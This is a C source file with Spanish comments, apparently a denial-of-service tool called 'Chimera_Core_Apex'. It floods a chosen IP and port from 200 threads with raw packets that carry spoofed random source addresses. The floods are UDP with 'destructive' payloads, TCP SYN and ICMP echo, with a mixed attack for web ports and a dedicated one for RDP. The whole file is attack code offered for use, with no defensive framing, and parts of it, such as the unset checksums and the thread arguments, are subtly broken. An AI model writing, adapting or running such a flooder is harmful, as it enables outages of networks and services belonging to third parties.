#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <signal.h>

#define MAX_PACKET_SIZE 65535
#define THREAD_COUNT 200

volatile int stop_flag = 0;
volatile long packet_count = 0;
pthread_mutex_t count_mutex = PTHREAD_MUTEX_INITIALIZER;

// Estructura para el encabezado IP
struct ip_header {
    unsigned char version_ihl;
    unsigned char tos;
    unsigned short total_length;
    unsigned short identification;
    unsigned short flags_fragment;
    unsigned char ttl;
    unsigned char protocol;
    unsigned short checksum;
    unsigned int source_ip;
    unsigned int dest_ip;
};

// Estructura para el encabezado UDP
struct udp_header {
    unsigned short source_port;
    unsigned short dest_port;
    unsigned short length;
    unsigned short checksum;
};

// Función para calcular checksum
unsigned short calculate_checksum(unsigned short *addr, int count) {
    register long sum = 0;
    
    while (count > 1) {
        sum += *addr++;
        count -= 2;
    }
    
    if (count > 0) {
        sum += *(unsigned char *)addr;
    }
    
    while (sum >> 16) {
        sum = (sum & 0xffff) + (sum >> 16);
    }
    
    return ~sum;
}

// Función de ataque UDP con paquetes personalizados
void* udp_attack(void* args) {
    char** target_info = (char**)args;
    char* target_ip = target_info[0];
    int target_port = atoi(target_info[1]);
    int duration = atoi(target_info[2]);
    int thread_id = atoi(target_info[3]);
    
    struct sockaddr_in target_addr;
    int sock;
    char packet[MAX_PACKET_SIZE];
    struct ip_header *ip_hdr = (struct ip_header *)packet;
    struct udp_header *udp_hdr = (struct udp_header *)(packet + sizeof(struct ip_header));
    char *data = packet + sizeof(struct ip_header) + sizeof(struct udp_header);
    int data_size = MAX_PACKET_SIZE - sizeof(struct ip_header) - sizeof(struct udp_header);
    
    // Configurar dirección del objetivo
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &target_addr.sin_addr);
    
    // Crear socket raw
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }
    
    // Configurar encabezado IP
    ip_hdr->version_ihl = 0x45;  // IPv4, 5 words
    ip_hdr->tos = 0;
    ip_hdr->total_length = htons(sizeof(struct ip_header) + sizeof(struct udp_header) + data_size);
    ip_hdr->identification = htons(rand());
    ip_hdr->flags_fragment = 0;
    ip_hdr->ttl = 64;
    ip_hdr->protocol = IPPROTO_UDP;
    ip_hdr->dest_ip = target_addr.sin_addr.s_addr;
    
    // Configurar encabezado UDP
    udp_hdr->dest_port = htons(target_port);
    udp_hdr->length = htons(sizeof(struct udp_header) + data_size);
    
    // Preparar diferentes payloads destructivos
    char payloads[5][MAX_PACKET_SIZE - sizeof(struct ip_header) - sizeof(struct udp_header)];
    
    // Payload 1: Bytes nulos
    memset(payloads[0], 0, data_size);
    
    // Payload 2: Bytes altos
    memset(payloads[1], 0xFF, data_size);
    
    // Payload 3: Caracteres 'A'
    memset(payloads[2], 'A', data_size);
    
    // Payload 4: Payload específico para RDP
    memset(payloads[3], 0, data_size);
    memcpy(payloads[3], "\x00\x01\x00\x00", 4);
    
    // Payload 5: Datos aleatorios
    for (int i = 0; i < data_size; i++) {
        payloads[4][i] = rand() % 256;
    }
    
    time_t end_time = time(NULL) + duration;
    
    while (!stop_flag && time(NULL) < end_time) {
        // IP de origen aleatoria
        ip_hdr->source_ip = rand();
        
        // Puerto de origen aleatorio
        udp_hdr->source_port = htons(rand() % 65535);
        
        // Elegir payload aleatorio
        int payload_index = rand() % 5;
        memcpy(data, payloads[payload_index], data_size);
        
        // Calcular checksum UDP
        udp_hdr->checksum = 0;
        
        // Enviar paquete
        if (sendto(sock, packet, sizeof(struct ip_header) + sizeof(struct udp_header) + data_size, 
                  0, (struct sockaddr*)&target_addr, sizeof(target_addr)) > 0) {
            pthread_mutex_lock(&count_mutex);
            packet_count++;
            pthread_mutex_unlock(&count_mutex);
        }
        
        // Pequeño retraso para evitar sobrecarga local
        usleep(1000);
    }
    
    close(sock);
    printf("Hilo UDP %d completado. Paquetes enviados: %ld\n", thread_id, packet_count);
    pthread_exit(NULL);
}

// Función de ataque TCP SYN
void* tcp_syn_attack(void* args) {
    char** target_info = (char**)args;
    char* target_ip = target_info[0];
    int target_port = atoi(target_info[1]);
    int duration = atoi(target_info[2]);
    int thread_id = atoi(target_info[3]);
    
    struct sockaddr_in target_addr;
    int sock;
    char packet[MAX_PACKET_SIZE];
    struct ip_header *ip_hdr = (struct ip_header *)packet;
    struct tcp_header {
        unsigned short source_port;
        unsigned short dest_port;
        unsigned int sequence;
        unsigned int acknowledgment;
        unsigned char data_offset;
        unsigned char flags;
        unsigned short window;
        unsigned short checksum;
        unsigned short urgent_pointer;
    } *tcp_hdr = (struct tcp_header *)(packet + sizeof(struct ip_header));
    
    // Configurar dirección del objetivo
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &target_addr.sin_addr);
    
    // Crear socket raw
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        perror("TCP socket creation failed");
        pthread_exit(NULL);
    }
    
    // Configurar encabezado IP
    ip_hdr->version_ihl = 0x45;
    ip_hdr->tos = 0;
    ip_hdr->total_length = htons(sizeof(struct ip_header) + sizeof(struct tcp_header));
    ip_hdr->identification = htons(rand());
    ip_hdr->flags_fragment = 0;
    ip_hdr->ttl = 64;
    ip_hdr->protocol = IPPROTO_TCP;
    ip_hdr->dest_ip = target_addr.sin_addr.s_addr;
    
    // Configurar encabezado TCP
    tcp_hdr->dest_port = htons(target_port);
    tcp_hdr->sequence = htonl(rand());
    tcp_hdr->acknowledgment = 0;
    tcp_hdr->data_offset = 5;
    tcp_hdr->flags = 0x02;  // SYN flag
    tcp_hdr->window = htons(65535);
    tcp_hdr->urgent_pointer = 0;
    
    time_t end_time = time(NULL) + duration;
    
    while (!stop_flag && time(NULL) < end_time) {
        // IP de origen aleatoria
        ip_hdr->source_ip = rand();
        
        // Puerto de origen aleatorio
        tcp_hdr->source_port = htons(rand() % 65535);
        
        // Calcular checksum TCP
        tcp_hdr->checksum = 0;
        
        // Enviar paquete
        if (sendto(sock, packet, sizeof(struct ip_header) + sizeof(struct tcp_header), 
                  0, (struct sockaddr*)&target_addr, sizeof(target_addr)) > 0) {
            pthread_mutex_lock(&count_mutex);
            packet_count++;
            pthread_mutex_unlock(&count_mutex);
        }
        
        // Pequeño retraso
        usleep(1000);
    }
    
    close(sock);
    printf("Hilo TCP SYN %d completado. Paquetes enviados: %ld\n", thread_id, packet_count);
    pthread_exit(NULL);
}

// Función de ataque ICMP
void* icmp_attack(void* args) {
    char** target_info = (char**)args;
    char* target_ip = target_info[0];
    int duration = atoi(target_info[2]);
    int thread_id = atoi(target_info[3]);
    
    struct sockaddr_in target_addr;
    int sock;
    char packet[MAX_PACKET_SIZE];
    struct ip_header *ip_hdr = (struct ip_header *)packet;
    struct icmp_header {
        unsigned char type;
        unsigned char code;
        unsigned short checksum;
        unsigned short id;
        unsigned short sequence;
    } *icmp_hdr = (struct icmp_header *)(packet + sizeof(struct ip_header));
    char *data = packet + sizeof(struct ip_header) + sizeof(struct icmp_header);
    int data_size = MAX_PACKET_SIZE - sizeof(struct ip_header) - sizeof(struct icmp_header);
    
    // Configurar dirección del objetivo
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    inet_pton(AF_INET, target_ip, &target_addr.sin_addr);
    
    // Crear socket raw
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) {
        perror("ICMP socket creation failed");
        pthread_exit(NULL);
    }
    
    // Configurar encabezado IP
    ip_hdr->version_ihl = 0x45;
    ip_hdr->tos = 0;
    ip_hdr->total_length = htons(sizeof(struct ip_header) + sizeof(struct icmp_header) + data_size);
    ip_hdr->identification = htons(rand());
    ip_hdr->flags_fragment = 0;
    ip_hdr->ttl = 64;
    ip_hdr->protocol = IPPROTO_ICMP;
    ip_hdr->dest_ip = target_addr.sin_addr.s_addr;
    
    // Configurar encabezado ICMP
    icmp_hdr->type = 8;  // Echo Request
    icmp_hdr->code = 0;
    icmp_hdr->id = htons(rand());
    icmp_hdr->sequence = 0;
    
    // Preparar datos
    memset(data, 'A', data_size);
    
    time_t end_time = time(NULL) + duration;
    
    while (!stop_flag && time(NULL) < end_time) {
        // IP de origen aleatoria
        ip_hdr->source_ip = rand();
        
        // Incrementar número de secuencia
        icmp_hdr->sequence++;
        
        // Calcular checksum ICMP
        icmp_hdr->checksum = 0;
        
        // Enviar paquete
        if (sendto(sock, packet, sizeof(struct ip_header) + sizeof(struct icmp_header) + data_size, 
                  0, (struct sockaddr*)&target_addr, sizeof(target_addr)) > 0) {
            pthread_mutex_lock(&count_mutex);
            packet_count++;
            pthread_mutex_unlock(&count_mutex);
        }
        
        // Pequeño retraso
        usleep(1000);
    }
    
    close(sock);
    printf("Hilo ICMP %d completado. Paquetes enviados: %ld\n", thread_id, packet_count);
    pthread_exit(NULL);
}

// Manejador de señal para detener el ataque
void signal_handler(int sig) {
    stop_flag = 1;
    printf("\nDeteniendo ataque...\n");
}

int main(int argc, char *argv[]) {
    if (argc < 4) {
        printf("Uso: ./Chimera_Core_Apex <IP> <PUERTO> <DURACION>\n");
        printf("Ejemplo: ./Chimera_Core_Apex 192.168.1.1 80 60\n");
        exit(1);
    }
    
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    
    printf("Iniciando ataque contra %s:%d durante %d segundos\n", target_ip, target_port, duration);
    printf("Presiona Ctrl+C para detener el ataque\n");
    
    // Configurar manejador de señal
    signal(SIGINT, signal_handler);
    
    // Inicializar mutex
    pthread_mutex_init(&count_mutex, NULL);
    
    // Crear hilos de ataque
    pthread_t threads[THREAD_COUNT];
    
    // Determinar qué tipo de ataque usar según el puerto
    if (target_port == 80 || target_port == 443 || target_port == 8080) {
        // Ataque mixto para servidores web
        for (int i = 0; i < THREAD_COUNT / 3; i++) {
            char *args[4] = {target_ip, argv[2], argv[3], (char*)malloc(20)};
            sprintf(args[3], "%d", i);
            pthread_create(&threads[i], NULL, udp_attack, args);
        }
        
        for (int i = THREAD_COUNT / 3; i < 2 * THREAD_COUNT / 3; i++) {
            char *args[4] = {target_ip, argv[2], argv[3], (char*)malloc(20)};
            sprintf(args[3], "%d", i);
            pthread_create(&threads[i], NULL, tcp_syn_attack, args);
        }
        
        for (int i = 2 * THREAD_COUNT / 3; i < THREAD_COUNT; i++) {
            char *args[4] = {target_ip, argv[2], argv[3], (char*)malloc(20)};
            sprintf(args[3], "%d", i);
            pthread_create(&threads[i], NULL, icmp_attack, args);
        }
    } else if (target_port == 3389) {
        // Ataque específico para RDP
        for (int i = 0; i < THREAD_COUNT; i++) {
            char *args[4] = {target_ip, argv[2], argv[3], (char*)malloc(20)};
            sprintf(args[3], "%d", i);
            pthread_create(&threads[i], NULL, udp_attack, args);
        }
    } else {
        // Ataque UDP por defecto
        for (int i = 0; i < THREAD_COUNT; i++) {
            char *args[4] = {target_ip, argv[2], argv[3], (char*)malloc(20)};
            sprintf(args[3], "%d", i);
            pthread_create(&threads[i], NULL, udp_attack, args);
        }
    }
    
    // Esperar a que todos los hilos terminen
    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(threads[i], NULL);
    }
    
    // Destruir mutex
    pthread_mutex_destroy(&count_mutex);
    
    printf("Ataque completado. Total de paquetes enviados: %ld\n", packet_count);
    
    return 0;
}
